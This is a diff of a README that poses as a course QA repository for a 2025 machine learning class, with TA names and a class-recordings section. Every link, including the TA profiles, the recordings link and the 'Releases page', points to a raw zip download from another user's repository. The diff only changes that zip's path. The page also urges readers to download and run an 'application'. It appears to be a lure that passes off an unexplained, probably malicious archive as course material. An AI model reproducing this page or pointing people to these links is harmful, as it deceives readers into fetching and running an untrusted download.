@@ -1,6 +1,6 @@
 # 🎓 MachineLearningCourse2025 - Your Guide to Learning Machine Learning
 
-[![Download MachineLearningCourse2025](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip%20Now-Here-blue)](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip)
+[![Download MachineLearningCourse2025](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip%20Now-Here-blue)](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip)
 
 ## 📖 Overview
 
@@ -8,15 +8,15 @@ This repository serves as an online QA platform for the 2025 Machine Learning co
 
 ## 🙋‍♂️ Meet Your TAs
 
-- 胡逸 (AheadOFpotato) - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip
-- 亢世嘉 - kang-0909 - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip
-- 汤平之 - Stanleytowne - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip
-- 何梓源 - Hazyuan - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip
+- 胡逸 (AheadOFpotato) - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip
+- 亢世嘉 - kang-0909 - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip
+- 汤平之 - Stanleytowne - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip
+- 何梓源 - Hazyuan - https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip
 
 ## 🎥 Class Recordings Link
 
 Currently, graduate students cannot access class recordings on the teaching website. We share them via Peking University’s Baidu Cloud. You can access the recordings through the following link:  
-[Class Recordings](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip)
+[Class Recordings](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip)
 
 ## 📅 Notifications
 
@@ -27,7 +27,7 @@ Currently, graduate students cannot access class recordings on the teaching webs
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip).
 
 2. **Choose Your Version**  
    Find the latest version of MachineLearningCourse2025 listed on the page. Look for a version number that looks something like **v1.0**.
@@ -46,7 +46,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download MachineLearningCourse2025](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/grow/MachineLearningCourse2025.zip). Follow the steps outlined above to install the application on your computer.
+To download the application, visit this page: [Download MachineLearningCourse2025](https://raw.githubusercontent.com/risivanthvs05/MachineLearningCourse2025/main/notes/2025/mvp/Course_Machine_Learning_v1.4.zip). Follow the steps outlined above to install the application on your computer.
 
 ## 🔍 FAQs
 
